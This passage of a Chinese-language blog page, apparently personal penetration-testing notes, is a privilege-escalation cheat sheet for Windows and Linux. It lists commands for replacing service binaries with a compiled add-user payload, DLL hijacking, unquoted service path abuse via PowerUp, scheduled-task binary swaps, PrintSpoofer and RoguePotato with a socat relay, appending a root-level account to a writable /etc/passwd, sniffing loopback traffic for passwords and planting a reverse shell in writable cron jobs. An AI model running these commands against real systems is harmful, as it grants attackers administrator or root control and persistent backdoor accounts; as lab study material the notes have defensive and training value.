</span></span><span class="line"><span class="cl">			<span class="nb">get-itemproperty</span> <span class="s2">&#34;HKLM:\SOFTWARE\Microsoft\*&#34;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">displayname</span>
</span></span><span class="line"><span class="cl">			<span class="n">download</span> 
</span></span><span class="line"><span class="cl">			<span class="n">C:</span><span class="p">//</span><span class="n">32位和64位Program</span> <span class="n">Files</span>
</span></span><span class="line"><span class="cl">			<span class="nb">ls </span><span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span>
</span></span><span class="line"><span class="cl">		    <span class="n">看权限</span>
</span></span><span class="line"><span class="cl">			<span class="n">icacls</span> <span class="s2">&#34;C:\xampp\apache\bin\httpd.exe&#34;</span>
</span></span><span class="line"><span class="cl">		 
</span></span><span class="line"><span class="cl">		
</span></span><span class="line"><span class="cl">	<span class="c">### 手动</span>
</span></span><span class="line"><span class="cl">		<span class="c">###查看正在运行的服务的信息</span>
</span></span><span class="line"><span class="cl">		<span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span><span class="n">State</span><span class="p">,</span><span class="n">PathName</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">State</span> <span class="o">-like</span> <span class="s1">&#39;Running&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="c">###查看正在运行的服务的启动类型</span>
</span></span><span class="line"><span class="cl">		<span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span> <span class="n">StartMode</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Name</span> <span class="o">-like</span> <span class="s1">&#39;everything&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">		
</span></span><span class="line"><span class="cl">		<span class="c">### 列举服务 </span>
</span></span><span class="line"><span class="cl">		<span class="n">services</span><span class="p">.</span><span class="n">msc</span><span class="err">，</span><span class="nb">Get-Service</span> <span class="nb">Cmdlet或Get-CimInstance</span> <span class="n">Cmdlet</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 列运行中的服务</span>
</span></span><span class="line"><span class="cl">		<span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span><span class="n">State</span><span class="p">,</span><span class="n">PathName</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">State</span> <span class="o">-like</span> <span class="s1">&#39;Running&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 看w权限</span>
</span></span><span class="line"><span class="cl">		<span class="n">icacls</span> <span class="s2">&#34;C:\xampp\apache\bin\httpd.exe&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="c">### c添加用户  /usr/share/privilege/win/adduser.c</span>
</span></span><span class="line"><span class="cl">		<span class="nb">x86_64-w64</span><span class="n">-mingw32-gcc</span> <span class="n">adduser</span><span class="p">.</span><span class="n">c</span> <span class="n">-o</span> <span class="n">adduser</span><span class="p">.</span><span class="n">exe</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 覆盖原文件 文件正在使用中》powershell下用move</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 服务重启 启动</span>
</span></span><span class="line"><span class="cl">		<span class="n">net</span> <span class="n">stop</span> <span class="n">mysql</span>
</span></span><span class="line"><span class="cl">		<span class="nb">Restart-Service</span> <span class="n">BetaService</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 服务的启动模式</span>
</span></span><span class="line"><span class="cl">		<span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span> <span class="n">StartMode</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Name</span> <span class="o">-like</span> <span class="s1">&#39;mysql&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 自动启动并且有重启权限的话可以重启机器</span>
</span></span><span class="line"><span class="cl">		<span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
</span></span><span class="line"><span class="cl">		<span class="n">shutdown</span> <span class="p">/</span><span class="nb">r </span><span class="p">/</span><span class="n">t</span> <span class="n">0</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 重启服务</span>
</span></span><span class="line"><span class="cl">			<span class="nb">Restart-Service</span>  <span class="n">a</span><span class="p">.</span><span class="n">exe</span>
</span></span><span class="line"><span class="cl">			<span class="n">sc</span><span class="p">.</span><span class="n">exe</span> <span class="n">qc</span> <span class="n">a</span><span class="p">.</span><span class="n">exe</span>
</span></span><span class="line"><span class="cl">				<span class="n">qc</span>     <span class="c">#服务信息 谁调用</span>
</span></span><span class="line"><span class="cl">				<span class="n">query</span>  <span class="c">#服务状态</span>
</span></span><span class="line"><span class="cl">				<span class="nb">start </span> <span class="c">#启动  权限大</span>
</span></span><span class="line"><span class="cl">		
</span></span><span class="line"><span class="cl"><span class="p">----------</span>
</span></span><span class="line"><span class="cl"><span class="c">## dll劫持</span>
</span></span><span class="line"><span class="cl"><span class="c">### 正常加载顺序。当禁用安全dll时当前目录会在第二步被搜索，dll缺失是个不错的位置</span>
</span></span><span class="line"><span class="cl">	<span class="n">1</span><span class="p">.</span> <span class="n">程序目录</span>
</span></span><span class="line"><span class="cl">	<span class="n">2</span><span class="p">.</span> <span class="n">系统目录</span>
</span></span><span class="line"><span class="cl">	<span class="n">3</span><span class="p">.</span> <span class="n">16位系统目录</span>
</span></span><span class="line"><span class="cl">	<span class="n">4</span><span class="p">.</span> <span class="n">windows目录</span>
</span></span><span class="line"><span class="cl">	<span class="n">5</span><span class="p">.</span> <span class="n">当前目录</span>
</span></span><span class="line"><span class="cl">	<span class="n">6</span><span class="p">.</span> <span class="nv">$PATH目录</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c">## 自动 </span>
</span></span><span class="line"><span class="cl">		<span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="nb">windows-resources</span><span class="p">/</span><span class="n">powersploit</span><span class="p">/</span><span class="n">Privesc</span><span class="p">/</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c">## 手动</span>
</span></span><span class="line"><span class="cl">	    <span class="p">!</span> <span class="n">sc</span><span class="p">.</span><span class="n">exe</span> <span class="c">#管理服务</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 列运行中的服务</span>
</span></span><span class="line"><span class="cl">			<span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span><span class="n">State</span><span class="p">,</span><span class="n">PathName</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">State</span> <span class="o">-like</span> <span class="s1">&#39;Running&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 看w权限</span>
</span></span><span class="line"><span class="cl">			<span class="n">icacls</span> <span class="s2">&#34;C:\xampp\apache\bin\httpd.exe&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 找不到替换的exe 找notfound的dll替换。procmod做筛选process name，筛选的是service的exe，</span>
</span></span><span class="line"><span class="cl">			<span class="n">tool</span><span class="err">：</span><span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">privilege</span><span class="p">/</span><span class="n">win</span><span class="p">/</span><span class="n">Procmondll</span><span class="p">/</span> <span class="n">64</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 恶意dll</span>
</span></span><span class="line"><span class="cl">			<span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">privilege</span><span class="p">/</span><span class="n">win</span><span class="p">/</span>
</span></span><span class="line"><span class="cl">			<span class="nb">x86_64-w64</span><span class="n">-mingw32-gcc</span> <span class="n">adduser</span><span class="p">.</span><span class="nb">cpp </span><span class="p">-</span><span class="n">-shared</span> <span class="n">-o</span> <span class="n">adduser</span><span class="p">.</span><span class="n">dll</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 重启服务</span>
</span></span><span class="line"><span class="cl">			<span class="nb">Restart-Service</span>  <span class="n">a</span><span class="p">.</span><span class="n">exe</span>
</span></span><span class="line"><span class="cl">			<span class="n">sc</span><span class="p">.</span><span class="n">exe</span> <span class="n">qc</span> <span class="n">a</span><span class="p">.</span><span class="n">exe</span>
</span></span><span class="line"><span class="cl">				<span class="n">qc</span>     <span class="c">#服务信息 谁调用</span>
</span></span><span class="line"><span class="cl">				<span class="n">query</span>  <span class="c">#服务状态</span>
</span></span><span class="line"><span class="cl">				<span class="nb">start </span> <span class="c">#启动  权限大</span>
</span></span><span class="line"><span class="cl">				
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl"><span class="p">----------</span>
</span></span><span class="line"><span class="cl"><span class="c">## 未引用路径 空格缺陷。主目录或子目录具有写权限，但无法替换其中的文件时</span>
</span></span><span class="line"><span class="cl">	<span class="c">### 自动</span>
</span></span><span class="line"><span class="cl">		<span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
</span></span><span class="line"><span class="cl">		<span class="n">powershell</span> <span class="n">-ep</span> <span class="n">bypass</span>
</span></span><span class="line"><span class="cl">		<span class="nb">Get-UnquotedService</span>
</span></span><span class="line"><span class="cl">		<span class="c">### exe是恶意exe</span>
</span></span><span class="line"><span class="cl">		<span class="nb">Write-ServiceBinary</span> <span class="n">-Name</span> <span class="s1">&#39;GammaService&#39;</span> <span class="n">-Path</span> <span class="s2">&#34;C:\Program Files\Enterprise Apps\Current.exe&#34;</span> 
</span></span><span class="line"><span class="cl">		
</span></span><span class="line"><span class="cl">	<span class="c">### 手动</span>
</span></span><span class="line"><span class="cl">		<span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span><span class="n">State</span><span class="p">,</span><span class="n">PathName</span>
</span></span><span class="line"><span class="cl">		<span class="n">cmd</span><span class="p">&gt;</span> <span class="n">wmic</span> <span class="n">service</span> <span class="n">get</span> <span class="n">name</span><span class="p">,</span><span class="n">pathname</span> <span class="p">|</span>  <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&#34;C:\Windows\\&#34;</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">		检查下能不能启动停止服务
</span></span></span><span class="line"><span class="cl"><span class="s2">		ps&gt; icacls看下路径的w权限
</span></span></span></code></pre></td></tr></table></div>
</div>
</div><h3 id="win计划任务"><a href="#win计划任务" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>win计划任务</h3>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">## 计划任务 寻找有权限的 然后文件替换</span>
</span></span><span class="line"><span class="cl">	<span class="c">## 计划任务列表</span>
</span></span><span class="line"><span class="cl">	<span class="n">schtasks</span> <span class="p">/</span><span class="n">query</span> <span class="p">/</span><span class="n">fo</span> <span class="n">LIST</span> <span class="p">/</span><span class="n">v</span>
</span></span><span class="line"><span class="cl">	<span class="c">## 看文件权限</span>
</span></span><span class="line"><span class="cl">	<span class="n">icacls</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">steve</span><span class="p">\</span><span class="n">Pictures</span><span class="p">\</span><span class="n">BackendCacheCleanup</span><span class="p">.</span><span class="n">exe</span>
</span></span><span class="line"><span class="cl">	<span class="c">## 替换</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><h3 id="其他"><a href="#其他" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>其他</h3>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">--------</span>
</span></span><span class="line"><span class="cl"><span class="c">## 应用程序漏洞</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">--------</span>
</span></span><span class="line"><span class="cl"><span class="c">## 内核洞 </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">--------</span>
</span></span><span class="line"><span class="cl"><span class="c">## Windows特权 一般很少，iis中多</span>
</span></span><span class="line"><span class="cl">	<span class="n">可能特权</span><span class="err">：</span><span class="n">SeBackupPrivilege</span><span class="err">、</span><span class="n">SeAssignPrimaryToken</span><span class="err">、</span><span class="n">SeLoadDriver和SeDebug和SeImpersonatePrivilege</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">看是否有以上权限</span> <span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
</span></span><span class="line"><span class="cl">	<span class="c">### tools</span>
</span></span><span class="line"><span class="cl">		<span class="n">PrintSpoofer</span>
</span></span><span class="line"><span class="cl">			<span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">privilege</span><span class="p">/</span><span class="n">win</span><span class="p">/</span><span class="n">PrintSpoofer64</span><span class="p">.</span><span class="n">exe</span>
</span></span><span class="line"><span class="cl">			<span class="p">.\</span><span class="n">PrintSpoofer64</span><span class="p">.</span><span class="n">exe</span> <span class="n">-i</span> <span class="n">-c</span> <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> 
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl">		<span class="n">potato家族</span><span class="err">：</span>         
</span></span><span class="line"><span class="cl">		<span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">jlajara</span><span class="p">.</span><span class="n">gitlab</span><span class="p">.</span><span class="n">io</span><span class="p">/</span><span class="n">Potatoes_Windows_Privesc</span>
</span></span><span class="line"><span class="cl">			<span class="n">Rogue</span> <span class="n">Potato</span> <span class="c">###好用</span>
</span></span><span class="line"><span class="cl">				<span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">privilege</span><span class="p">/</span><span class="n">win</span><span class="p">/</span><span class="n">RoguePotato</span><span class="p">.</span><span class="n">exe</span>
</span></span><span class="line"><span class="cl">				<span class="n">socat</span> <span class="nb">tcp-listen</span><span class="err">:</span><span class="n">135</span><span class="p">,</span><span class="n">reuseaddr</span><span class="p">,</span><span class="n">fork</span> <span class="n">tcp</span><span class="err">:</span><span class="n">VICTIM_IP</span><span class="err">:</span><span class="n">9999</span>
</span></span><span class="line"><span class="cl">				<span class="p">.\</span><span class="n">RoguePotato</span><span class="p">.</span><span class="n">exe</span> <span class="n">-r</span> <span class="n">YOUR_IP</span> <span class="n">-e</span> <span class="s2">&#34;command&#34;</span> <span class="n">-l</span> <span class="n">9999</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="n">RottenPotato</span>
</span></span><span class="line"><span class="cl">			<span class="n">SweetPotato</span>
</span></span><span class="line"><span class="cl">			<span class="n">JuicyPotato</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><h2 id="linux提权"><a href="#linux提权" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>linux提权</h2>
<h3 id="linux信息收集"><a href="#linux信息收集" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>linux信息收集</h3>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">------
</span></span><span class="line"><span class="cl"><span class="c1">## 自动</span>
</span></span><span class="line"><span class="cl">	<span class="c1">### unix-privesc-check</span>
</span></span><span class="line"><span class="cl">		kali&gt; /usr/bin/unix-privesc-check <span class="p">|</span>/usr/share/privilege/linux/unix-privesc-check
</span></span><span class="line"><span class="cl">		use: ./unix-privesc-check standard &gt; output.txt
</span></span><span class="line"><span class="cl">	LinEnum
</span></span><span class="line"><span class="cl">	LinPeas  /usr/share/privilege/linux/
</span></span><span class="line"><span class="cl">------
</span></span><span class="line"><span class="cl"><span class="c1">## 手动</span>
</span></span><span class="line"><span class="cl">	<span class="c1">## 用户</span>
</span></span><span class="line"><span class="cl">		id 
</span></span><span class="line"><span class="cl">			uid1000是第一个
</span></span><span class="line"><span class="cl">		cat /etc/passwd
</span></span><span class="line"><span class="cl">			<span class="c1">### 利用：条件passwd文件能写</span>
</span></span><span class="line"><span class="cl">			密码大概率用crypt加密，也可能des或md5
</span></span><span class="line"><span class="cl">				openssl passwd root
</span></span><span class="line"><span class="cl">				<span class="nb">echo</span> <span class="s2">&#34;root2:jHAWKFhGozqCg:0:0:root:/root:/bin/bash&#34;</span> &gt;&gt; /etc/passwd
</span></span><span class="line"><span class="cl">				
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	hostname 
</span></span><span class="line"><span class="cl">	<span class="c1">## 版本信息</span>
</span></span><span class="line"><span class="cl">		uname -a 
</span></span><span class="line"><span class="cl">	    cat /etc/issue
</span></span><span class="line"><span class="cl">	    cat /etc/os-release
</span></span><span class="line"><span class="cl">	    arch
</span></span><span class="line"><span class="cl">    <span class="c1">## 进程</span>
</span></span><span class="line"><span class="cl">	    ps aux 
</span></span><span class="line"><span class="cl">		    -C 进程名
</span></span><span class="line"><span class="cl">		watch -n <span class="m">1</span> <span class="s2">&#34;ps -aux | grep pass&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="c1">## 流量 管理员权限</span>
</span></span><span class="line"><span class="cl">		sudo tcpdump -i lo -A <span class="p">|</span> grep <span class="s2">&#34;pass&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="c1">## 路由 </span>
</span></span><span class="line"><span class="cl">	    ip a
</span></span><span class="line"><span class="cl">	    routel
</span></span><span class="line"><span class="cl">	<span class="c1">## 网络</span>
</span></span><span class="line"><span class="cl">	    ss -anp
</span></span><span class="line"><span class="cl">	    netstat -anp
</span></span><span class="line"><span class="cl">	<span class="c1">## 防火墙</span>
</span></span><span class="line"><span class="cl">	    cat /etc/iptables/....
</span></span><span class="line"><span class="cl">	<span class="c1">## 计划任务</span>
</span></span><span class="line"><span class="cl">		ls -lah /etc/cron*
</span></span><span class="line"><span class="cl">	    sudo crontab -l 
</span></span><span class="line"><span class="cl">	    cat /var/log/cron.log
</span></span><span class="line"><span class="cl">	    grep <span class="s2">&#34;CRON&#34;</span> /var/log/syslog
</span></span><span class="line"><span class="cl">	    找能w的文件，反弹shell
</span></span><span class="line"><span class="cl">	<span class="c1">## 敏感文件</span>
</span></span><span class="line"><span class="cl">		env 
</span></span><span class="line"><span class="cl">	    .bashrc
</span></span><span class="line"><span class="cl">	<span class="c1">## 写带s权限的文件夹</span>
</span></span><span class="line"><span class="cl">		find /var -type d -perm /2  2&gt;/dev/null
</span></span><span class="line"><span class="cl">		find /var -type d -perm -u<span class="o">=</span>w  2&gt;/dev/null
</span></span><span class="line"><span class="cl">	<span class="c1">## 带s权限的文件 suid</span>
</span></span><span class="line"><span class="cl">		find /    -type f -perm -u<span class="o">=</span>s suid
</span></span><span class="line"><span class="cl">		find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
</span></span><span class="line"><span class="cl">		<span class="c1">###这种权限的文件会以文件创建者的权限执行，有继承的文件的话其为esid euid</span>
</span></span><span class="line"><span class="cl">		利用方式: 往下翻，见不安全的组件
</span></span><span class="line"><span class="cl">	<span class="c1">## 有写权限的目录</span>
</span></span><span class="line"><span class="cl">		find / -writable -type d 2&gt;/dev/null
</span></span><span class="line"><span class="cl">    <span class="c1">## 安装的程序</span>
</span></span><span class="line"><span class="cl">		dpkg -l
